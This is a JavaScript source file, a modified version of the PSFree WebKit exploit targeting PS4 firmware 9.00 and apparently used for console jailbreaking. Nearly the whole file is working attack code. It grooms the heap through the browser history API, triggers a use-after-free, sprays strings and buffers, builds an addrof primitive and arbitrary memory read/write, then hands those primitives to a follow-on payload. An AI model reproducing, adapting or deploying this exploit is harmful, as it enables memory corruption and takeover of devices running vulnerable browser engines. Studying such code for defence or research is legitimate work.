/* Copyright (C) 2023-2024 anonymous

This file is part of PSFree. mod by @mour0ne

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

const ps4_9_00 = 2;
const target = ps4_9_00;
const ssv_len = 0x50;

const num_reuse = 0x4000;

const js_butterfly = 0x8;
const view_m_vector = 0x10;
const view_m_length = 0x18;
const view_m_mode = 0x1c;
const size_view = 0x20;
const strimpl_strlen = 4;
const strimpl_m_data = 8;
const strimpl_inline_str = 0x14;
const size_strimpl = 0x18;

const original_strlen = ssv_len - size_strimpl;
const buffer_len = 0x20;

const num_str = 0x4000;
const num_gc = 30;
const num_space = 19;
const original_loc = window.location.pathname;
const loc = original_loc + '#foo';

let rstr = null;
let view_leak_arr = [];
let jsview = [];
let s1 = {views: []};
let view_leak = null;

let input = document.body.appendChild(document.createElement("input"));
input.style.position = "absolute";
input.style.top = "-100px";
let foo = document.body.appendChild(document.createElement("a"));
foo.id = "foo";

let pressure = null;

function gc(num_loop) {
   pressure = Array(100);
   for (let i = 0; i < num_loop; i++) {
       for (let i = 0; i < pressure.length; i++) {
           pressure[i] = new Uint32Array(0x40000);
       }
       pressure = Array(100);
   }
   pressure = null;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function prepare_uaf() {
    history.pushState('state0', '');
    for (let i = 0; i < num_space; i++) {
        history.replaceState('state0', '');
    }

    history.replaceState("state1", "", loc);

    history.pushState("state2", "");
    for (let i = 0; i < num_space; i++) {
        history.replaceState("state2", "");
    }
}

function free(save) {
    history.replaceState('state3', '', original_loc);

    for (let i = 0; i < num_reuse; i++) {
        let view = new Uint8Array(new ArrayBuffer(ssv_len));
        for (let i = 0; i < view.length; i++) {
            view[i] = 0x41;
        }
        save.views.push(view);
    }
}

function check_spray(views) {
    if (views.length !== num_reuse) {
        debug_log(`views.length: ${views.length}`);
        die('views.length !== num_reuse, restart the entire exploit');
    }

    for (let i = 0; i < num_reuse; i++) {
        if (views[i][0] !== 0x41) {
            return i;
        }
    }
    return null;
}

async function use_after_free(pop_func, save) {
    const pop_promise = new Promise((resolve, reject) => {
        function pop_wrapper(event) {
            try {
                pop_func(event, save);
            } catch (e) {
                reject(e);
            }
            resolve();
        }
        addEventListener("popstate", pop_wrapper, {once:true});
    });

    prepare_uaf();

    let num_free = 0;
    function onblur() {
        if (num_free > 0)  {
            die('multiple free()s, restart the entire exploit');
        }
        free(save);
        num_free++;
    }

    input.onblur = onblur;
    await new Promise((resolve) => {
        input.addEventListener('focus', resolve, {once:true});
        input.focus();
    });
    history.back();
    
    await pop_promise;
}

async function setup_ar(save) {
    const view = save.ab;

    view[0] = 1;
    for (let i = 1; i < view.length; i++) {
        view[i] = 0;
    }

    delete save.views;
    delete save.pop;
    gc(num_gc);

    let total_sleep = 0;
    const num_sleep = 2;
    while (true && target !== ps4_9_00) {
        await sleep(num_sleep);
        total_sleep += num_sleep;

        if (view[0] !== 1) {
            break;
        }
    }

    let num_spray = 0;
    while (true) {
        const obj = {};
        num_spray++;

        for (let i = 0; i < num_str; i++) {
            let str = new String(
                'B'.repeat(original_strlen - 5)
                + i.toString().padStart(5, '0')
            );
            obj[str] = 0x1337;
        }

        if (view[strimpl_inline_str] === 0x42) {
            write32(view, strimpl_strlen, 0xffffffff);
        } else {
            continue;
        }

        let found = false;
        const str_arr = Object.getOwnPropertyNames(obj);
        for (let i = 0; i < str_arr.length; i++) {
            if (str_arr[i].length > 0xff) {
                rstr = str_arr[i];
                found = true;
                break;
            }
        }
        if (!found) {
            continue;
        }

        return;
    }
}

async function double_free(save) {
    const view = save.ab;

    await setup_ar(save);

    let buffer = new ArrayBuffer(buffer_len);
    let tmp = [];
    const num_alloc = 0x10000;
    const num_threshold = 0xfc00;
    const num_diff = num_alloc - num_threshold;
    for (let i = 0; i < num_alloc; i++) {
        if (i >= num_threshold) {
            view_leak_arr.push(new Uint8Array(buffer));
        } else {
            tmp.push(new Uint8Array(buffer));
        }
    }
    tmp = null;

    let props = [];
    for (let i = 0; i < num_diff; i++) {
        props.push({ value: 0x43434343 });
        props.push({ value: view_leak_arr[i] });
    }

    search: while (true) {
        Object.defineProperties({}, props);
        for (let i = 0; i < 0x800000; i++) {
            let v = null;
            if (rstr.charCodeAt(i) === 0x43 &&
                rstr.charCodeAt(i + 1) === 0x43 &&
                rstr.charCodeAt(i + 2) === 0x43 &&
                rstr.charCodeAt(i + 3) === 0x43
            ) {
                if (rstr.charCodeAt(i + 0x08) === 0x00 &&
                    rstr.charCodeAt(i + 0x0f) === 0x00 &&
                    rstr.charCodeAt(i + 0x10) === 0x00 &&
                    rstr.charCodeAt(i + 0x17) === 0x00 &&
                    rstr.charCodeAt(i + 0x18) === 0x0e &&
                    rstr.charCodeAt(i + 0x1f) === 0x00 &&
                    rstr.charCodeAt(i + 0x28) === 0x00 &&
                    rstr.charCodeAt(i + 0x2f) === 0x00 &&
                    rstr.charCodeAt(i + 0x30) === 0x00 &&
                    rstr.charCodeAt(i + 0x37) === 0x00 &&
                    rstr.charCodeAt(i + 0x38) === 0x0e &&
                    rstr.charCodeAt(i + 0x3f) === 0x00
                ) {
                    v = str2array(rstr, 8, i + 0x20);
                } else if (rstr.charCodeAt(i + 0x10) === 0x43 &&
                    rstr.charCodeAt(i + 0x11) === 0x43 &&
                    rstr.charCodeAt(i + 0x12) === 0x43 &&
                    rstr.charCodeAt(i + 0x13) === 0x43) {
                    v = str2array(rstr, 8, i + 8);
                }
            }
            if (v !== null) {
                view_leak = new Int(v);
                break search;
            }
        }
    }

    let rstr_addr = read64(view, strimpl_m_data);
    write64(view, strimpl_m_data, view_leak);

    for (let i = 0; i < 4; i++) {
        jsview.push(sread64(rstr, i * 8));
    }

    write64(view, strimpl_m_data, rstr_addr);
    write32(view, strimpl_strlen, original_strlen);
}

function find_leaked_view(rstr, view_rstr, view_m_vector, view_arr) {
    const old_m_data = read64(view_rstr, strimpl_m_data);

    let res = null;
    write64(view_rstr, strimpl_m_data, view_m_vector);
    for (const view of view_arr) {
        const magic = 0x41424344;
        write32(view, 0, magic);

        if (sread64(rstr, 0).low() === magic) {
            res = view;
            break;
        }
    }
    write64(view_rstr, strimpl_m_data, old_m_data);

    if (res === null) {
        die('view not found');
    }
    return res;
}

class Reader {
    constructor(rstr, view_rstr, leaker, leaker_addr) {
        this.rstr = rstr;
        this.view_rstr = view_rstr;
        this.leaker = leaker;
        this.leaker_addr = leaker_addr;
        this.old_m_data = read64(view_rstr, strimpl_m_data);

        leaker.a = 0;
    }

    addrof(obj) {
        if (typeof obj !== 'object' && typeof obj !== 'function') {
            throw TypeError('addrof argument not a JS object');
        }

        this.leaker.a = obj;

        write64(this.view_rstr, strimpl_m_data, this.leaker_addr);

        const butterfly = sread64(this.rstr, js_butterfly);
        write64(this.view_rstr, strimpl_m_data, butterfly.sub(0x10));

        const res = sread64(this.rstr, 0);

        write64(this.view_rstr, strimpl_m_data, this.old_m_data);
        return res;
    }

    get_view_vector(view) {
        if (!ArrayBuffer.isView(view)) {
            throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
        }

        write64(this.view_rstr, strimpl_m_data, this.addrof(view));
        const res = sread64(this.rstr, view_m_vector);

        write64(this.view_rstr, strimpl_m_data, this.old_m_data);
        return res;
    }
}

function setup_ssv_data(reader) {
    const r = reader;
    const size_vector = 0x10;
    const size_abc = target === ps4_9_00 ? 0x18 : 0x20;

    const m_data = new Uint8Array(size_vector);
    const data = new Uint8Array(9);

    write64(m_data, 0, r.get_view_vector(data));
    write32(m_data, 8, data.length);
    write32(m_data, 0xc, data.length);

    const CurrentVersion = 6;
    const ArrayBufferTransferTag = 23;
    write32(data, 0, CurrentVersion);
    data[4] = ArrayBufferTransferTag;
    write32(data, 5, 0);

    const abc_vector = new Uint8Array(size_vector);
    const abc = new Uint8Array(size_abc);

    write64(abc_vector, 0, r.get_view_vector(abc));
    write32(abc_vector, 8, 1);
    write32(abc_vector, 0xc, 1);

    const worker = new Uint8Array(new ArrayBuffer(1));

    if (target !== ps4_9_00) {
        write64(abc, 0, Int.Zero);
        write64(abc, 8, Int.Zero);
        write64(abc, 0x10, r.addrof(worker));
        write32(abc, 0x18, size_view);
    } else {
        write64(abc, 0, r.addrof(worker));
        write32(abc, 8, 0);
        write16(abc, 0xc, 0);
        write32(abc, 0xe, 0);
        write16(abc, 0x12, 0);
        write32(abc, 0x14, size_view);
    }

    return {
        m_data,
        m_arrayBufferContentsArray: r.get_view_vector(abc_vector),
        worker,
        nogc: [
            data,
            abc_vector,
            abc,
        ],
    };
}

async function setup_arw(save, ssv_data) {
    const num_msg = 1000;
    const view = save.ab;
    let msgs = [];

    function onmessage(event) {
        msgs.push(event);
    }
    addEventListener('message', onmessage);

    rstr = null;
    while (true) {
        for (let i = 0; i < num_msg; i++) {
            postMessage('', origin);
        }

        while (msgs.length !== num_msg) {
            await sleep(10);
        }

        if (view[strimpl_inline_str] !== 0x42) {
            break;
        }

        msgs = [];
    }
    removeEventListener('message', onmessage);

    const copy = [];
    for (let i = 0; i < view.length; i++) {
        copy.push(view[i]);
    }

    const { m_data, m_arrayBufferContentsArray, worker, nogc } = ssv_data;
    write64(view, 8, read64(m_data, 0));
    write64(view, 0x10, read64(m_data, 8));
    write64(view, 0x18, m_arrayBufferContentsArray);

    for (const msg of msgs) {
        if (msg.data !== '') {
           // debug_log('[+] Wk exploit (PSFree) ( r/w)');

            const u = new Uint8Array(msg.data);

            const mem = new Memory(u, worker);

            view.set(copy);

            view_leak_arr = null;
            view_leak = null;
            jsview = null;
            input = null;
            foo = null;

            return;
        }
    }
    die('no arbitrary r/w');
}

async function triple_free(save, jsview, view_leak_arr, leaked_view_addr) {
    const leaker = find_leaked_view(rstr, save.ab, jsview[2], view_leak_arr);
    let r = new Reader(rstr, save.ab, leaker, leaked_view_addr);
    const ssv_data = setup_ssv_data(r);

    r = null;
    await setup_arw(save, ssv_data);
}

function pop(event, save) {
    let spray_res = check_spray(save.views);
    if (spray_res === null) {
        die('failed spray');
    } else {
        save.pop = event;
        save.ab = save.views[spray_res];
    }
}

async function get_ready() {
    await new Promise((resolve, reject) => {
        if (document.readyState !== "complete") {
            document.addEventListener("DOMContentLoaded", resolve);
            return;
        }
        resolve();
    });
}

async function run_psfree(attempt = 1) {
    const max_attempts = 9;

    // debug_log(`[ PSFree - Attempt ${attempt} ]`);
    
    try {
        debug_log('[ PSFree - Step 0 ]');
        await get_ready();

        debug_log('[ PSFree - Step 1 ]');
        await use_after_free(pop, s1);

        debug_log('[ PSFree - Step 2 ]');

        // Timeout mechanism for step 2
        const step2Promise = new Promise(async (resolve, reject) => {
            await sleep(100);  // Sleep time for step 2
            await double_free(s1);
            resolve();
        });

        const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout during step 2')), 5000)); // 5 seconds timeout

        await Promise.race([step2Promise, timeoutPromise]);

        debug_log('[ PSFree - Step 3 ]');
        await triple_free(s1, jsview, view_leak_arr, view_leak);

        // debug_log('[+] Webkit exploit (PSFree) succeeded');

        let prim = {
            read1(addr) {
                addr = new Int(addr.low, addr.hi);
                const res = mem.read8(addr);
                return res;
            },

            read2(addr) {
                addr = new Int(addr.low, addr.hi);
                const res = mem.read16(addr);
                return res;
            },

            read4(addr) {
                addr = new Int(addr.low, addr.hi);
                const res = mem.read32(addr);
                return res;
            },

            read8(addr) {
                addr = new Int(addr.low, addr.hi);
                const res = mem.read64(addr);
                return new int64(res.low(), res.high());
            },

            write1(addr, value) {
                addr = new Int(addr.low, addr.hi);
                mem.write8(addr, value);
            },

            write2(addr, value) {
                addr = new Int(addr.low, addr.hi);
                mem.write16(addr, value);
            },

            write4(addr, value) {
                addr = new Int(addr.low, addr.hi);
                mem.write32(addr, value);
            },

            write8(addr, value) {
                addr = new Int(addr.low, addr.hi);
                if (value instanceof int64) {
                    value = new Int(value.low, value.hi);
                    mem.write64(addr, value);
                } else {
                    mem.write64(addr, new Int(value));
                }
            },

            leakval(obj) {
                const res = mem.addrof(obj);
                return new int64(res.low(), res.high());
            }
        };

        window.p = prim;
        run_hax();
    } catch (error) {
       // debug_log(`[!] Error: ${error.message}`);
        
        if (attempt < max_attempts) {
           // debug_log(`[Retry] Attempt ${attempt + 1}`);
            await sleep(1000);
            return run_psfree(attempt + 1);
        } else {
            die('PSFree exploit failed after multiple attempts');
        }
    }
}
